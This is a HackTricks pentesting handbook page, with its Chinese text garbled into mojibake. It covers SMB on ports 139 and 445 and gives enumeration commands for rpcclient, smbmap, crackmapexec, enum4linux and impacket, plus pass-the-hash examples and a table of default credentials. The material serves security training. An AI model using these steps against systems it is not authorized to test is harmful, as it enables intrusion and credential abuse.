<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>139,445 - Pentesting SMB</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="139445---pentesting-smb"><a class="header" href="#139445---pentesting-smb">139,445 - Pentesting SMB</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<h2 id="ç«¯å£-139"><a class="header" href="#ç«¯å£-139"><strong>ç«¯å£ 139</strong></a></h2>
<p><em><strong>ç½‘ç»œåŸºæœ¬è¾“å…¥è¾“å‡ºç³»ç»Ÿ</strong></em>** (NetBIOS)** æ˜¯ä¸€ç§è½¯ä»¶åè®®ï¼Œæ—¨åœ¨ä½¿å±€åŸŸç½‘ (LAN) å†…çš„åº”ç”¨ç¨‹åºã€ä¸ªäººç”µè„‘å’Œæ¡Œé¢èƒ½å¤Ÿä¸ç½‘ç»œç¡¬ä»¶äº¤äº’ï¼Œå¹¶<strong>ä¿ƒè¿›æ•°æ®åœ¨ç½‘ç»œä¸­çš„ä¼ è¾“</strong>ã€‚é€šè¿‡å…¶ NetBIOS åç§°ï¼ˆé•¿åº¦å¯è¾¾ 16 ä¸ªå­—ç¬¦ï¼Œé€šå¸¸ä¸è®¡ç®—æœºåç§°ä¸åŒï¼‰æ¥è¯†åˆ«å’Œå®šä½åœ¨ NetBIOS ç½‘ç»œä¸Šè¿è¡Œçš„è½¯ä»¶åº”ç”¨ç¨‹åºã€‚å½“ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼ˆå……å½“å®¢æˆ·ç«¯ï¼‰å‘å‡ºå‘½ä»¤â€œå‘¼å«â€å¦ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼ˆå……å½“æœåŠ¡å™¨ï¼‰æ—¶ï¼Œä¸¤ä¸ªåº”ç”¨ç¨‹åºä¹‹é—´çš„ NetBIOS ä¼šè¯é€šè¿‡<strong>TCP ç«¯å£ 139</strong>å¯åŠ¨ã€‚</p>
<pre><code>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</code></pre>
<h2 id="port-445"><a class="header" href="#port-445">Port 445</a></h2>
<p>ä»æŠ€æœ¯ä¸Šè®²ï¼Œç«¯å£ 139 è¢«ç§°ä¸ºâ€œNBT over IPâ€ï¼Œè€Œç«¯å£ 445 è¢«è¯†åˆ«ä¸ºâ€œSMB over IPâ€ã€‚ç¼©å†™ <strong>SMB</strong> ä»£è¡¨â€œ<strong>æœåŠ¡å™¨æ¶ˆæ¯å—</strong>â€ï¼Œç°ä»£ä¹Ÿè¢«ç§°ä¸º <strong>é€šç”¨äº’è”ç½‘æ–‡ä»¶ç³»ç»Ÿ (CIFS)</strong>ã€‚ä½œä¸ºä¸€ç§åº”ç”¨å±‚ç½‘ç»œåè®®ï¼ŒSMB/CIFS ä¸»è¦ç”¨äºå®ç°å¯¹æ–‡ä»¶ã€æ‰“å°æœºã€ä¸²å£çš„å…±äº«è®¿é—®ï¼Œå¹¶ä¿ƒè¿›ç½‘ç»œèŠ‚ç‚¹ä¹‹é—´çš„å„ç§å½¢å¼çš„é€šä¿¡ã€‚</p>
<p>ä¾‹å¦‚ï¼Œåœ¨ Windows çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œå¼ºè°ƒ SMB å¯ä»¥ç›´æ¥é€šè¿‡ TCP/IP æ“ä½œï¼Œä»è€Œæ¶ˆé™¤äº†é€šè¿‡ç«¯å£ 445 ä½¿ç”¨ NetBIOS over TCP/IP çš„å¿…è¦æ€§ã€‚ç›¸åï¼Œåœ¨ä¸åŒçš„ç³»ç»Ÿä¸Šï¼Œè§‚å¯Ÿåˆ°ä½¿ç”¨ç«¯å£ 139ï¼Œè¿™è¡¨æ˜ SMB æ­£åœ¨ä¸ NetBIOS over TCP/IP ä¸€èµ·æ‰§è¡Œã€‚</p>
<pre><code>445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
</code></pre>
<h3 id="smb"><a class="header" href="#smb">SMB</a></h3>
<p><strong>æœåŠ¡å™¨æ¶ˆæ¯å— (SMB)</strong> åè®®åœ¨ <strong>å®¢æˆ·ç«¯-æœåŠ¡å™¨</strong> æ¨¡å‹ä¸­è¿è¡Œï¼Œæ—¨åœ¨è°ƒèŠ‚å¯¹ <strong>æ–‡ä»¶</strong>ã€ç›®å½•å’Œå…¶ä»–ç½‘ç»œèµ„æºï¼ˆå¦‚æ‰“å°æœºå’Œè·¯ç”±å™¨ï¼‰çš„ <strong>è®¿é—®</strong>ã€‚ä¸»è¦ç”¨äº <strong>Windows</strong> æ“ä½œç³»ç»Ÿç³»åˆ—ï¼ŒSMB ç¡®ä¿å‘åå…¼å®¹ï¼Œå…è®¸è¿è¡Œè¾ƒæ–°ç‰ˆæœ¬å¾®è½¯æ“ä½œç³»ç»Ÿçš„è®¾å¤‡ä¸è¿è¡Œè¾ƒæ—§ç‰ˆæœ¬çš„è®¾å¤‡æ— ç¼äº¤äº’ã€‚æ­¤å¤–ï¼Œ<strong>Samba</strong> é¡¹ç›®æä¾›äº†ä¸€ä¸ªå…è´¹è½¯ä»¶è§£å†³æ–¹æ¡ˆï¼Œä½¿ SMB èƒ½å¤Ÿåœ¨ <strong>Linux</strong> å’Œ Unix ç³»ç»Ÿä¸Šå®ç°ï¼Œä»è€Œé€šè¿‡ SMB ä¿ƒè¿›è·¨å¹³å°é€šä¿¡ã€‚</p>
<p>å…±äº«ï¼Œä»£è¡¨ <strong>æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿçš„ä»»æ„éƒ¨åˆ†</strong>ï¼Œå¯ä»¥ç”± SMB æœåŠ¡å™¨æä¾›ï¼Œä½¿å®¢æˆ·ç«¯éƒ¨åˆ† <strong>ç‹¬ç«‹</strong> äºæœåŠ¡å™¨çš„å®é™…ç»“æ„åœ°å¯è§ã€‚<strong>è®¿é—®æ§åˆ¶åˆ—è¡¨ (ACLs)</strong> å®šä¹‰äº† <strong>è®¿é—®æƒé™</strong>ï¼Œå…è®¸å¯¹ç”¨æˆ·æƒé™è¿›è¡Œ <strong>ç»†ç²’åº¦æ§åˆ¶</strong>ï¼ŒåŒ…æ‹¬ <strong><code>æ‰§è¡Œ</code></strong>ã€<strong><code>è¯»å–</code></strong> å’Œ <strong><code>å®Œå…¨è®¿é—®</code></strong> ç­‰å±æ€§ã€‚è¿™äº›æƒé™å¯ä»¥æ ¹æ®å…±äº«åˆ†é…ç»™å•ä¸ªç”¨æˆ·æˆ–ç»„ï¼Œå¹¶ä¸”ä¸æœåŠ¡å™¨ä¸Šè®¾ç½®çš„æœ¬åœ°æƒé™ä¸åŒã€‚</p>
<h3 id="ipc-share"><a class="header" href="#ipc-share">IPC$ Share</a></h3>
<p>å¯ä»¥é€šè¿‡åŒ¿åç©ºä¼šè¯è®¿é—® IPC$ å…±äº«ï¼Œä»è€Œä¸é€šè¿‡å‘½åç®¡é“æš´éœ²çš„æœåŠ¡è¿›è¡Œäº¤äº’ã€‚å®ç”¨å·¥å…· <code>enum4linux</code> å¯¹æ­¤éå¸¸æœ‰ç”¨ã€‚æ­£ç¡®ä½¿ç”¨æ—¶ï¼Œå®ƒå¯ä»¥è·å–ï¼š</p>
<ul>
<li>æ“ä½œç³»ç»Ÿä¿¡æ¯</li>
<li>çˆ¶åŸŸçš„è¯¦ç»†ä¿¡æ¯</li>
<li>æœ¬åœ°ç”¨æˆ·å’Œç»„çš„æ±‡ç¼–</li>
<li>å¯ç”¨ SMB å…±äº«çš„ä¿¡æ¯</li>
<li>æœ‰æ•ˆçš„ç³»ç»Ÿå®‰å…¨ç­–ç•¥</li>
</ul>
<p>æ­¤åŠŸèƒ½å¯¹äºç½‘ç»œç®¡ç†å‘˜å’Œå®‰å…¨ä¸“ä¸šäººå‘˜è¯„ä¼°ç½‘ç»œä¸Š SMB (æœåŠ¡å™¨æ¶ˆæ¯å—) æœåŠ¡çš„å®‰å…¨æ€åŠ¿è‡³å…³é‡è¦ã€‚<code>enum4linux</code> æä¾›äº†ç›®æ ‡ç³»ç»Ÿ SMB ç¯å¢ƒçš„å…¨é¢è§†å›¾ï¼Œè¿™å¯¹äºè¯†åˆ«æ½œåœ¨æ¼æ´å’Œç¡®ä¿ SMB æœåŠ¡å¾—åˆ°é€‚å½“ä¿æŠ¤è‡³å…³é‡è¦ã€‚</p>
<pre><code class="language-bash">enum4linux -a target_ip
</code></pre>
<p>ä¸Šè¿°å‘½ä»¤æ˜¯å¦‚ä½•ä½¿ç”¨ <code>enum4linux</code> å¯¹æŒ‡å®šçš„ <code>target_ip</code> è¿›è¡Œå®Œæ•´æšä¸¾çš„ç¤ºä¾‹ã€‚</p>
<h2 id="ä»€ä¹ˆæ˜¯-ntlm"><a class="header" href="#ä»€ä¹ˆæ˜¯-ntlm">ä»€ä¹ˆæ˜¯ NTLM</a></h2>
<p>å¦‚æœä½ ä¸çŸ¥é“ä»€ä¹ˆæ˜¯ NTLMï¼Œæˆ–è€…ä½ æƒ³çŸ¥é“å®ƒæ˜¯å¦‚ä½•å·¥ä½œçš„ä»¥åŠå¦‚ä½•åˆ©ç”¨å®ƒï¼Œä½ ä¼šå‘ç°è¿™é¡µå…³äº <strong>NTLM</strong> çš„å†…å®¹éå¸¸æœ‰è¶£ï¼Œå…¶ä¸­è§£é‡Šäº† <strong>è¿™ä¸ªåè®®æ˜¯å¦‚ä½•å·¥ä½œçš„ä»¥åŠä½ å¦‚ä½•åˆ©ç”¨å®ƒï¼š</strong></p>
<p>{% content-ref url="../../windows-hardening/ntlm/" %}
<a href="../../windows-hardening/ntlm/">ntlm</a>
{% endcontent-ref %}</p>
<h2 id="æœåŠ¡å™¨æšä¸¾"><a class="header" href="#æœåŠ¡å™¨æšä¸¾"><strong>æœåŠ¡å™¨æšä¸¾</strong></a></h2>
<h3 id="æ‰«æ-ç½‘ç»œä»¥æœç´¢ä¸»æœº"><a class="header" href="#æ‰«æ-ç½‘ç»œä»¥æœç´¢ä¸»æœº"><strong>æ‰«æ</strong> ç½‘ç»œä»¥æœç´¢ä¸»æœºï¼š</a></h3>
<pre><code class="language-bash">nbtscan -r 192.168.0.1/24
</code></pre>
<h3 id="smb-æœåŠ¡å™¨ç‰ˆæœ¬"><a class="header" href="#smb-æœåŠ¡å™¨ç‰ˆæœ¬">SMB æœåŠ¡å™¨ç‰ˆæœ¬</a></h3>
<p>è¦æŸ¥æ‰¾å¯èƒ½é’ˆå¯¹ SMB ç‰ˆæœ¬çš„æ¼æ´ï¼Œäº†è§£æ­£åœ¨ä½¿ç”¨çš„ç‰ˆæœ¬éå¸¸é‡è¦ã€‚å¦‚æœæ­¤ä¿¡æ¯æœªåœ¨å…¶ä»–ä½¿ç”¨çš„å·¥å…·ä¸­å‡ºç°ï¼Œæ‚¨å¯ä»¥ï¼š</p>
<ul>
<li>ä½¿ç”¨ <strong>MSF</strong> è¾…åŠ©æ¨¡å— _<strong>auxiliary/scanner/smb/smb_version</strong></li>
<li>æˆ–è€…è¿™ä¸ªè„šæœ¬ï¼š</li>
</ul>
<pre><code class="language-bash">#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" &amp;&amp; exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2&gt;/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' &amp; echo -n "$rhost: " &amp;
echo "exit" | smbclient -L $rhost 1&gt;/dev/null 2&gt;/dev/null
echo "" &amp;&amp; sleep .1
</code></pre>
<h3 id="æœç´¢æ¼æ´"><a class="header" href="#æœç´¢æ¼æ´"><strong>æœç´¢æ¼æ´</strong></a></h3>
<pre><code class="language-bash">msf&gt; search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
</code></pre>
<h3 id="å¯èƒ½çš„-å‡­æ®"><a class="header" href="#å¯èƒ½çš„-å‡­æ®"><strong>å¯èƒ½çš„</strong> å‡­æ®</a></h3>
<div class="table-wrapper"><table><thead><tr><th><strong>ç”¨æˆ·å</strong></th><th><strong>å¸¸è§å¯†ç </strong></th></tr></thead><tbody>
<tr><td><em>(ç©ºç™½)</em></td><td><em>(ç©ºç™½)</em></td></tr>
<tr><td>guest</td><td><em>(ç©ºç™½)</em></td></tr>
<tr><td>Administrator, admin</td><td><em>(ç©ºç™½)</em>, password, administrator, admin</td></tr>
<tr><td>arcserve</td><td>arcserve, backup</td></tr>
<tr><td>tivoli, tmersrvd</td><td>tivoli, tmersrvd, admin</td></tr>
<tr><td>backupexec, backup</td><td>backupexec, backup, arcada</td></tr>
<tr><td>test, lab, demo</td><td>password, test, lab, demo</td></tr>
</tbody></table>
</div>
<h3 id="æš´åŠ›ç ´è§£"><a class="header" href="#æš´åŠ›ç ´è§£">æš´åŠ›ç ´è§£</a></h3>
<ul>
<li><a href="../../generic-hacking/brute-force.html#smb"><strong>SMB æš´åŠ›ç ´è§£</strong></a></li>
</ul>
<h3 id="smb-ç¯å¢ƒä¿¡æ¯"><a class="header" href="#smb-ç¯å¢ƒä¿¡æ¯">SMB ç¯å¢ƒä¿¡æ¯</a></h3>
<h3 id="è·å–ä¿¡æ¯"><a class="header" href="#è·å–ä¿¡æ¯">è·å–ä¿¡æ¯</a></h3>
<pre><code class="language-bash">#Dump interesting information
enum4linux -a [-u "&lt;username&gt;" -p "&lt;passwd&gt;"] &lt;IP&gt;
enum4linux-ng -A [-u "&lt;username&gt;" -p "&lt;passwd&gt;"] &lt;IP&gt;
nmap --script "safe or smb-enum-*" -p 445 &lt;IP&gt;

#Connect to the rpc
rpcclient -U "" -N &lt;IP&gt; #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" &lt;IP&gt; #With creds
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]&lt;targetName or address&gt;
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]&lt;targetName or address&gt;

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]&lt;targetName or address&gt;
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]&lt;targetName or address&gt;
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]&lt;targetName or address&gt;
</code></pre>
<h3 id="æšä¸¾ç”¨æˆ·ç»„å’Œç™»å½•ç”¨æˆ·"><a class="header" href="#æšä¸¾ç”¨æˆ·ç»„å’Œç™»å½•ç”¨æˆ·">æšä¸¾ç”¨æˆ·ã€ç»„å’Œç™»å½•ç”¨æˆ·</a></h3>
<p>è¿™äº›ä¿¡æ¯åº”è¯¥å·²ç»ä» enum4linux å’Œ enum4linux-ng æ”¶é›†ã€‚</p>
<pre><code class="language-bash">crackmapexec smb 10.10.10.10 --users [-u &lt;username&gt; -p &lt;password&gt;]
crackmapexec smb 10.10.10.10 --groups [-u &lt;username&gt; -p &lt;password&gt;]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u &lt;username&gt; -p &lt;password&gt;]

ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&amp;(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

rpcclient -U "" -N 10.10.10.10
enumdomusers
enumdomgroups
</code></pre>
<h3 id="æšä¸¾æœ¬åœ°ç”¨æˆ·"><a class="header" href="#æšä¸¾æœ¬åœ°ç”¨æˆ·">æšä¸¾æœ¬åœ°ç”¨æˆ·</a></h3>
<p><a href="https://github.com/fortra/impacket/blob/master/examples/lookupsid.py">Impacket</a></p>
<pre><code class="language-bash">lookupsid.py -no-pass hostname.local
</code></pre>
<p>å•è¡Œå‘½ä»¤</p>
<pre><code class="language-bash">for i in $(seq 500 1100);do rpcclient -N -U "" 10.10.10.10 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" &amp;&amp; echo "";done
</code></pre>
<h3 id="metasploit---æšä¸¾æœ¬åœ°ç”¨æˆ·"><a class="header" href="#metasploit---æšä¸¾æœ¬åœ°ç”¨æˆ·">Metasploit - æšä¸¾æœ¬åœ°ç”¨æˆ·</a></h3>
<pre><code class="language-bash">use auxiliary/scanner/smb/smb_lookupsid
set rhosts hostname.local
run
</code></pre>
<h3 id="æšä¸¾-lsarpc-å’Œ-samr-rpcclient"><a class="header" href="#æšä¸¾-lsarpc-å’Œ-samr-rpcclient"><strong>æšä¸¾ LSARPC å’Œ SAMR rpcclient</strong></a></h3>
<p>{% content-ref url="rpcclient-enumeration.md" %}
<a href="rpcclient-enumeration.html">rpcclient-enumeration.md</a>
{% endcontent-ref %}</p>
<h3 id="ä»-linux-è¿›è¡Œ-gui-è¿æ¥"><a class="header" href="#ä»-linux-è¿›è¡Œ-gui-è¿æ¥">ä» Linux è¿›è¡Œ GUI è¿æ¥</a></h3>
<h4 id="åœ¨ç»ˆç«¯ä¸­"><a class="header" href="#åœ¨ç»ˆç«¯ä¸­">åœ¨ç»ˆç«¯ä¸­ï¼š</a></h4>
<p><code>xdg-open smb://cascade.htb/</code></p>
<h4 id="åœ¨æ–‡ä»¶æµè§ˆå™¨çª—å£ä¸­nautilus-thunar-ç­‰"><a class="header" href="#åœ¨æ–‡ä»¶æµè§ˆå™¨çª—å£ä¸­nautilus-thunar-ç­‰">åœ¨æ–‡ä»¶æµè§ˆå™¨çª—å£ä¸­ï¼ˆnautilus, thunar ç­‰ï¼‰</a></h4>
<p><code>smb://friendzone.htb/general/</code></p>
<h2 id="å…±äº«æ–‡ä»¶å¤¹æšä¸¾"><a class="header" href="#å…±äº«æ–‡ä»¶å¤¹æšä¸¾">å…±äº«æ–‡ä»¶å¤¹æšä¸¾</a></h2>
<h3 id="åˆ—å‡ºå…±äº«æ–‡ä»¶å¤¹"><a class="header" href="#åˆ—å‡ºå…±äº«æ–‡ä»¶å¤¹">åˆ—å‡ºå…±äº«æ–‡ä»¶å¤¹</a></h3>
<p>å§‹ç»ˆå»ºè®®æŸ¥çœ‹æ‚¨æ˜¯å¦å¯ä»¥è®¿é—®ä»»ä½•å†…å®¹ï¼Œå¦‚æœæ‚¨æ²¡æœ‰å‡­æ®ï¼Œè¯·å°è¯•ä½¿ç”¨ <strong>null</strong> <strong>å‡­æ®/è®¿å®¢ç”¨æˆ·</strong>ã€‚</p>
<pre><code class="language-bash">smbclient --no-pass -L //&lt;IP&gt; # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //&lt;IP&gt; #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

smbmap -H &lt;IP&gt; [-P &lt;PORT&gt;] #Null user
smbmap -u "username" -p "password" -H &lt;IP&gt; [-P &lt;PORT&gt;] #Creds
smbmap -u "username" -p "&lt;NT&gt;:&lt;LM&gt;" -H &lt;IP&gt; [-P &lt;PORT&gt;] #Pass-the-Hash
smbmap -R -u "username" -p "password" -H &lt;IP&gt; [-P &lt;PORT&gt;] #Recursive list

crackmapexec smb &lt;IP&gt; -u '' -p '' --shares #Null user
crackmapexec smb &lt;IP&gt; -u 'username' -p 'password' --shares #Guest user
crackmapexec smb &lt;IP&gt; -u 'username' -H '&lt;HASH&gt;' --shares #Guest user
</code></pre>
<h3 id="è¿æ¥åˆ—å‡ºå…±äº«æ–‡ä»¶å¤¹"><a class="header" href="#è¿æ¥åˆ—å‡ºå…±äº«æ–‡ä»¶å¤¹"><strong>è¿æ¥/åˆ—å‡ºå…±äº«æ–‡ä»¶å¤¹</strong></a></h3>
<pre><code class="language-bash">#Connect using smbclient
smbclient --no-pass //&lt;IP&gt;/&lt;Folder&gt;
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //&lt;IP&gt; #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient

#List with smbmap, without folder it list everything
smbmap [-u "username" -p "password"] -R [Folder] -H &lt;IP&gt; [-P &lt;PORT&gt;] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H &lt;IP&gt; [-P &lt;PORT&gt;] # Non-Recursive list
smbmap -u "username" -p "&lt;NT&gt;:&lt;LM&gt;" [-r/-R] [Folder] -H &lt;IP&gt; [-P &lt;PORT&gt;] #Pass-the-Hash
</code></pre>
<h3 id="æ‰‹åŠ¨æšä¸¾-windows-å…±äº«å¹¶è¿æ¥åˆ°å®ƒä»¬"><a class="header" href="#æ‰‹åŠ¨æšä¸¾-windows-å…±äº«å¹¶è¿æ¥åˆ°å®ƒä»¬"><strong>æ‰‹åŠ¨æšä¸¾ Windows å…±äº«å¹¶è¿æ¥åˆ°å®ƒä»¬</strong></a></h3>
<p>å¯èƒ½æ‚¨è¢«é™åˆ¶æ˜¾ç¤ºä¸»æœºçš„ä»»ä½•å…±äº«ï¼Œå½“æ‚¨å°è¯•åˆ—å‡ºå®ƒä»¬æ—¶ï¼Œä¼¼ä¹æ²¡æœ‰ä»»ä½•å…±äº«å¯ä¾›è¿æ¥ã€‚å› æ­¤ï¼Œå°è¯•æ‰‹åŠ¨è¿æ¥åˆ°å…±äº«å¯èƒ½æ˜¯å€¼å¾—çš„ã€‚è¦æ‰‹åŠ¨æšä¸¾å…±äº«ï¼Œæ‚¨å¯èƒ½æƒ³è¦æŸ¥æ‰¾åƒ NT_STATUS_ACCESS_DENIED å’Œ NT_STATUS_BAD_NETWORK_NAME è¿™æ ·çš„å“åº”ï¼Œå½“ä½¿ç”¨æœ‰æ•ˆä¼šè¯ï¼ˆä¾‹å¦‚ï¼Œç©ºä¼šè¯æˆ–æœ‰æ•ˆå‡­æ®ï¼‰æ—¶ã€‚è¿™äº›å¯èƒ½è¡¨æ˜å…±äº«æ˜¯å¦å­˜åœ¨ä»¥åŠæ‚¨æ˜¯å¦æ²¡æœ‰è®¿é—®æƒé™ï¼Œæˆ–è€…å…±äº«æ ¹æœ¬ä¸å­˜åœ¨ã€‚</p>
<p>Windows ç›®æ ‡çš„å¸¸è§å…±äº«åç§°åŒ…æ‹¬</p>
<ul>
<li>C$</li>
<li>D$</li>
<li>ADMIN$</li>
<li>IPC$</li>
<li>PRINT$</li>
<li>FAX$</li>
<li>SYSVOL</li>
<li>NETLOGON</li>
</ul>
<p>ï¼ˆæ¥è‡ª <em><strong>ç½‘ç»œå®‰å…¨è¯„ä¼° ç¬¬3ç‰ˆ</strong></em> çš„å¸¸è§å…±äº«åç§°ï¼‰</p>
